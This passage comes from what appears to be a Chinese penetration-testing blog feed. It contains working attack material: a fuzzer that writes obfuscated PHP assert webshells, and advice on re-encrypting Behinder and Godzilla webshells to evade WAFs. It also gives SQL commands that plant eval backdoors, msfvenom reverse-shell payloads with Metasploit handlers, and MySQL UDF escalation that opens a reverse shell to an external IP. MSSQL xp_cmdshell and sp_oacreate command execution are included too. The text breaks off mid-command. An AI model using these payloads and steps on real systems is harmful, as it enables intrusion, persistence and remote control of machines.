class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">异或</span></span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">import threading,queue</span><br><span class=\"line\"></span><br><span class=\"line\">def string():</span><br><span class=\"line\">  while not q.empty():</span><br><span class=\"line\">    filename=q.get()</span><br><span class=\"line\">    url = &#x27;http://10.0.1:8081/x/&#x27; + filename</span><br><span class=\"line\">    datas = &#123;</span><br><span class=\"line\">      &#x27;x&#x27;: &#x27;phpinfo();&#x27;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    result = requests.post(url, data=datas).content.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">    if &#x27;XIAODI-PC&#x27; in result:</span><br><span class=\"line\">      print (&#x27;check-&gt;&#x27;+filename+&#x27;-&gt;ok&#x27;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">      print (&#x27;check-&gt;&#x27;+filename+&#x27;-&gt;no&#x27;)</span><br><span class=\"line\">    time.sleep(1)</span><br><span class=\"line\"></span><br><span class=\"line\">def shell_test_check():</span><br><span class=\"line\">  url=&#x27;http://0.1:8081/x/33xd6php&#x27;</span><br><span class=\"line\">  datas=&#123;</span><br><span class=\"line\">    &#x27;x&#x27;:&#x27;phpinfo();&#x27;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result=requests.post(url,data=datas).content.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">  print (result)</span><br><span class=\"line\">  if &#x27;XIAODI-PC&#x27; in result:</span><br><span class=\"line\">    print (&#x27;ok&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">q=queue.Queue()</span><br><span class=\"line\">  for i in range(1, 127):</span><br><span class=\"line\">    for ii in range(1, 127):</span><br><span class=\"line\">      payload = &quot;&#x27;&quot;&quot;&#x27;&quot; + chr(i) + &quot;&#x27;&quot; + &#x27;^&#x27; + &quot;&#x27;&quot;&quot;&#x27;&quot; + chr(ii) + &quot;&#x27;&quot;</span><br><span class=\"line\">      code = &quot;&lt;?php $a=(&quot; + payload + &quot;).&#x27;ssert&#x27;;$a($_POST[x]);?&gt;&quot;</span><br><span class=\"line\">      filename = str(i) + &#x27;xd&#x27; + str(ii) + &#x27;.php&#x27;</span><br><span class=\"line\">      q.put(filename)</span><br><span class=\"line\">      with open(&#x27;D:/phpstudy/PHPTutorial/WWW/x/&#x27; + filename, &#x27;a&#x27;) as f:</span><br><span class=\"line\">        f.write(code)</span><br><span class=\"line\">        f.close()</span><br><span class=\"line\">        print(&#x27;Fuzz文件生成成功&#x27;)</span><br><span class=\"line\">  for x in range(20):</span><br><span class=\"line\">    t=threading.Thread(target=string)</span><br><span class=\"line\">    t.start()</span><br></pre></td></tr></table></figure>\n<p><strong>可以通过在线的接口将自己的木马再次加密，如果此加密未加入到官方的指纹系统，则还是可以绕过 waf 的。如将哥斯拉自动生成的马再次进行加密。加密后上传 webshell，仍旧可以连接成功，则可以绕。</strong></p>\n<h3 id=\"冰蝎哥斯拉流量分析\"><a class=\"markdownIt-Anchor\" href=\"#冰蝎哥斯拉流量分析\">#</a> 冰蝎哥斯拉流量分析</h3>\n<h4 id=\"waf绕过思路\"><a class=\"markdownIt-Anchor\" href=\"#waf绕过思路\">#</a> waf 绕过思路</h4>\n<p>可能通过正则匹配、机器学习、行为分析等方式来绕过 waf。实战中多半是先进的安全公司的设备，必须进行魔改各种连接工具才可以绕过 waf，需要 就具体情况进行判断。</p>\n<p>webshell 利用工具的流量也可以通过 proxifer 设置代理转发至 burp 观察，实际上，proxifer 的作用就是拦截一些不能设置代理的软件，将其流量代理到自己 设置的目标端口上，目标端口可以是快代理，burp，fiddler 等可以监听端口的工具。</p>\n<p>或者不借助 proxifer 而是用 wireshark 来捕获网卡中的所有流量，通过过滤数据包来确定当前所使用工具的流量，跟随流量流，分析流量特征。</p>\n<p>如果一堆加密字符中出现了大量的 &quot;/“以及不规则的大小写字母及数字组成， 则可以判断出此加密可能属于 AES; 如果有大量的等号而无”/&quot; 则可以猜测属于 base64。</p>\n<h4 id=\"冰蟹原理\"><a class=\"markdownIt-Anchor\" href=\"#冰蟹原理\">#</a> 冰蟹原理</h4>\n<p>自己手动输入一个密钥，并采用 md5 加密生成 32 位字符取前 16 位作为 key 值，服务端接收客户端发送的 key 存储 session 返回客户端，客户端先将代码进 行 base64 编码，再继续发送基于 key 与偏移量 0123456789abcdef 及采用 CBC 模式的 AES 加密操作的数据包，此后服务器解密数据包进行遍历自身文件或其他 操作，并把结果再次进行一层 base64 编码及 AES 加密，客户端接受服务端发送的数据包解密后并在工具上做展示。</p>\n<h4 id=\"冰蟹数据包特征\"><a class=\"markdownIt-Anchor\" href=\"#冰蟹数据包特征\">#</a> 冰蟹数据包特征</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent：代码中定义</span><br><span class=\"line\"></span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Type：application/x-www-form-urlencoded</span><br><span class=\"line\"></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/ap ng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"></span><br><span class=\"line\">Accept-Encoding: gzip, deflate, br</span><br><span class=\"line\"></span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br></pre></td></tr></table></figure>\n<p>每次冰蟹操作数据时都会发送出这几个数据，这几个数据单独来看是没有 什么特征的，但是如果合在一起使用就可以确定很大概率是冰蟹在操作，可以 认为是恶意指令。</p>\n<p>通过 wireshark 抓取冰蟹操作时的流量，分析流量特征进行捕获从而确定出 指纹；且其采用 jar 文件生成，可以反编译查找其中的指纹来源进行修订再次重 新编译成 jar 包，并修订原有指纹绕过 waf，生成一个自己专属的 webshell 连接 工具。</p>\n<p>反编译 jar 文件用 jd-jui 打开之后，如果代码中含有 php 代码是看不了的，还是需要将其导入到 IDEA 中才可以看到全部的代码。</p>\n<h4 id=\"哥斯拉数据包特征\"><a class=\"markdownIt-Anchor\" href=\"#哥斯拉数据包特征\">#</a> 哥斯拉数据包特征</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: Mozilla/0 (Windows NT 0; Win64; x64; rv:80) Gecko/20100101 Firefox/80</span><br><span class=\"line\"></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie: PHPSESSID=rut2a51prso470jvfe2q502o44; cookie 最后面存在一个&quot;;&quot;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/",
            "title": "XD22 9 权限提升",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"webshell-提权\"><a class=\"markdownIt-Anchor\" href=\"#webshell-提权\">#</a> webshell 提权</h3>\n<h4 id=\"phpmyadmin-突破\"><a class=\"markdownIt-Anchor\" href=\"#phpmyadmin-突破\">#</a> phpmyadmin 突破</h4>\n<p>phpadmin 通过后台写 sql 拿 webshell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示当前目录</span></span><br><span class=\"line\">show variables like &#x27;%datadir%&#x27;;或 select @@basedir;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看数据库当前操作用户拥有写权限</span></span><br><span class=\"line\">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入后门</span></span><br><span class=\"line\">select &#x27;&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;&#x27; INTO OUTFILE &#x27;/var/lib/mysql/a.php&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启慢日志记录</span></span><br><span class=\"line\">set global slow_query_log=1;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置日志存储目录</span></span><br><span class=\"line\">set global slow_query_log_file=&#x27;/var/lib/www/blog.1.php&#x27;;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入木马记录在日志</span></span><br><span class=\"line\">select &#x27;&lt;?php eval($_GET[A])?&gt;&#x27; or SLEEP(1);</span><br></pre></td></tr></table></figure>\n<p><strong>secure_file_priv 参数：NULL 不允许导入或导出、/tmp 只允许在 /tmp 目录导入导出、空则不限制目录</strong><br>\n<strong> root 高权限读文件：UNION SELECT 1,load_file (‘d:/w.txt’),3</strong><br>\n<strong>root 高权限写文件：UNION SELECT 1,‘xxxx’,3 into outfile 'd:/www.txt’</strong></p>\n<h4 id=\"win-web-提权\"><a class=\"markdownIt-Anchor\" href=\"#win-web-提权\">#</a> win web 提权</h4>\n<ul>\n<li>信息收集</li>\n</ul>\n<p>操作系统版本、漏洞补丁、系统位数、杀软防护、网络情况、当前权限等 信息。如 ver、systeminfo、whoami、netstat -ano、tasklist /svc 等。</p>\n<p>如果提权中无法执行命令，需要通过 web 权限上传 cmd.exej 进行执行，基 于补丁和系统版本位数来进行筛选可用溢出漏洞 EXP、手工操作、基于 CS 的 半自动化提权、基于 MSF 的全自动化提权。</p>\n<ul>\n<li>手工查找 CVE 与 EXP</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bG1vbi9WdWxtYXA=\">https://github.com/vulmon/Vulmap</span> (不建议)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpdHNhZG1pbi93ZXNuZw==\">https://github.com/bitsadmin/wesng</span> (systeminfo&gt; 1.txt, 之后用 wesng 去解析， 效果一般)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nocm9ibGVydC9XaW5kb3dzVnVsblNjYW4=\">https://github.com/chroblert/WindowsVulnScan</span> (.\\KBCollect.ps1 生成 KB.json 再去解析)</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=\">https://i.hacking8.com/tiquan</span> (将 systeminfo 的信息输入到此页面查找漏洞)</p>\n<ul>\n<li>工具辅助提权</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FzY290YmUvS2VybmVsSHVi\">https://github.com/Ascotbe/KernelHub</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vbWktc2VjL1BvQy1pbi1HaXRIdWI=\">https://github.com/nomi-sec/PoC-in-GitHub</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2s4Z2VnZS9MYWRvbg==\">https://github.com/k8gege/Ladon</span></p>\n<p>工具提权不一定能成功，因为受作者测试环境与真实环境的不同，脚本难以完全一致，通常会选取 msf/cs 的自动化提权，毕竟经过了时间的考究。</p>\n<h4 id=\"msf-全自动提权\"><a class=\"markdownIt-Anchor\" href=\"#msf-全自动提权\">#</a> MSF 全自动提权</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成反弹后门</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=3333 -f exe -o msf.exe</span><br><span class=\"line\">msfvenom - a x86 --platform windows - p windows/meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=4444 - b &quot;\\x00&quot; - i 10 - f exe - o ~/Desktop/t.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配置监听会话</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">exploit</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">筛选EXP模块</span></span><br><span class=\"line\">background</span><br><span class=\"line\">use post/windows/gather/enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）</span><br><span class=\"line\">use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）</span><br><span class=\"line\">set session 1</span><br><span class=\"line\">set showdescription true</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">特别注意如果没有显示出来漏洞利用脚本，需要更新msf即使用msfupdate命令</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用EXP溢出提权，注意需要重新监听会话并指定端口</span></span><br><span class=\"line\">background</span><br><span class=\"line\">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class=\"line\">set localhot. set local port</span><br><span class=\"line\">set session 1</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<h4 id=\"cs半自动化提权\"><a class=\"markdownIt-Anchor\" href=\"#cs半自动化提权\">#</a> cs 半自动化提权</h4>\n<ul>\n<li>配置启动</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务器启动服务端</span></span><br><span class=\"line\">chmod +x teamserver &amp; ./teamserver IP password</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">客户端连接服务端</span></span><br><span class=\"line\">运行cobaltstrike.bat（运行不起来请检测JDK版本）</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>配置监听器生成后执行</p>\n</li>\n<li>\n<p>选择提权模块调用执行，默认的脚本不够好，需要用加载的如 taowu、lodon 脚本</p>\n</li>\n</ul>\n<h3 id=\"数据库提权\"><a class=\"markdownIt-Anchor\" href=\"#数据库提权\">#</a> 数据库提权</h3>\n<h4 id=\"mysql-提权\"><a class=\"markdownIt-Anchor\" href=\"#mysql-提权\">#</a> mysql 提权</h4>\n<p>用系统漏洞提权要比数据库漏洞提权更容易得到权限。</p>\n<p>一般采用 UDF 提权和启动项的方式，都需要拿到此时的数据库的 root 权限， 并且两者都是需要往特殊目录下写入文件，并且需要 - secure-file-priv 没进行目 录限制，如果做了目录限制是无法提权到系统权限的</p>\n<ul>\n<li>mysql UDF 提权</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">mysql&lt;5.2 导出目录</span></span><br><span class=\"line\">c:/windows或system32；</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">mysql=&gt;5.2 导出安装目录/lib/plugin/</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">select version()查看当前的数据库版本</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">select @@basedir查看当前的目录</span></span><br><span class=\"line\">GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;允许所有账户的外连</span><br></pre></td></tr></table></figure>\n<p>使用 MSF 中的 exploit/multi/mysql/mysql_udf_payload 模块可以进行 UDF 提 权，MSF 会将 dll 文件写入 lib\\plugin\\ 目录下 (如果没有 /lib/plugin/ 这个目录，需要 手动创建这个文件夹), 该 dll 文件中包含 sys_exec () 和 sys_eval () 两个函数，但是 默认只创建 sys_exec () 函数，该函数执行并不会有回显。我们可以手动创建 sys_eval () 函数，来执行有回显的命令。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF:（前提先开外连）</span></span><br><span class=\"line\">use exploit/multi/mysql/mysql_udf_payload</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set password root</span><br><span class=\"line\">set rhosts 47.102.195.100</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">当msf将dll文件写入/lib/plugin下，可使用Navicat调用系统命令</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看</span></span><br><span class=\"line\">select * from mysql.func where name = &quot;sys_exec&quot;; </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建函数绑定dll</span></span><br><span class=\"line\">create function sys_eval returns string soname &quot;WqkerHcA.dll&quot;;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调用函数进行命令执行</span></span><br><span class=\"line\">select sys_eval(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>mysql 启动项提权</li>\n</ul>\n<p>写一些启动项到 windows 上，windows 启动后会启动这类 bat 或者 exe，可以在 bat 中加 calc pause 进行测试。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF：（前提先开外连）</span></span><br><span class=\"line\">use exploit/windows/mysql/mysql_start_up</span><br><span class=\"line\">set rhosts 47.102.195.100</span><br><span class=\"line\">set username root</span><br><span class=\"line\">set password root</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<ul>\n<li>mysql 通过 udf 反弹 shell</li>\n</ul>\n<p>原理同 udf 提权，再 plugin 下写入 dll 文件，用 sys_exec 调用 dll 执行系统命令，从而反弹 shell，需要提前监听 shell 端口（如果 linux 的话就是 so 文件）。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://blog.csdn.net/weixin_43801718/article/details/105493042</span></span><br><span class=\"line\">use mysql;</span><br><span class=\"line\">set @a=concat(&#x27;&#x27;,</span><br><span class=\"line\">create table Ghost(data LONGBLOB);</span><br><span class=\"line\">insert into Ghost values(&quot;&quot;);update Ghost set data = @a;</span><br><span class=\"line\">select data from Ghost into DUMPFILE &#x27;C:\\\\phpstudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll&#x27;;</span><br><span class=\"line\">create function backshell returns string soname &#x27;udf.dll&#x27;;</span><br><span class=\"line\">select backshell(&#x27;47.94.236.117&#x27;,7788)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>MOF 提权</li>\n</ul>\n<p>MOF-Win2008 后权限控制导致无效（不好用）<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlzaGFvbmlhbi9wLzYzODQ1MzUuaHRtbA==\">https://www.cnblogs.com/xishaonian/p/6384535.html</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF：</span></span><br><span class=\"line\">use exploit/windows/mysql/mysql_mof</span><br></pre></td></tr></table></figure>\n<h4 id=\"mssql-提权\"><a class=\"markdownIt-Anchor\" href=\"#mssql-提权\">#</a> mssql 提权</h4>\n<p>MSSQL 提权（windows 安装的，在 linux 上没有）</p>\n<ul>\n<li>xp_cmdshell 提权</li>\n</ul>\n<p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。如果用户拥有管理员 sa 权限则可以用 sp_configure 重新开启它。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">启用</span></span><br><span class=\"line\">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class=\"line\">RECONFIGURE;</span><br><span class=\"line\">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class=\"line\">RECONFIGURE;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">关闭</span></span><br><span class=\"line\">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class=\"line\">reconfigure;</span><br><span class=\"line\">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;</span><br><span class=\"line\">reconfigure;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行</span></span><br><span class=\"line\">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class=\"line\">如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</span><br><span class=\"line\">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\\Program Files\\MicrosoftSQL Server\\MSSQL\\Binn\\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>sp_oacreate 提权</li>\n</ul>\n<p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">启用</span></span><br><span class=\"line\">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class=\"line\">RECONFIGURE WITH OVERRIDE;</span><br><span class=\"line\">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class=\"line\">RECONFIGURE WITH OVERRIDE;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">关闭</span></span><br><span class=\"line\">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class=\"line\">RECONFIGURE WITH OVERRIDE;</span><br><span class=\"line\">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;</span><br><span class=\"line\">RECONFIGURE WITH OVERRIDE;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行</span></span><br><span class=\"line\">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec</span><br><span class=\"line\">sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt;c:\\\\1.txt&#x27;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>沙盒提权</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">不开启的话在执行xp_regwrite会提示让我们开启：</span></span><br><span class=\"line\">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class=\"line\">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码：</span></span><br><span class=\"line\">exec master..xp_regwrite 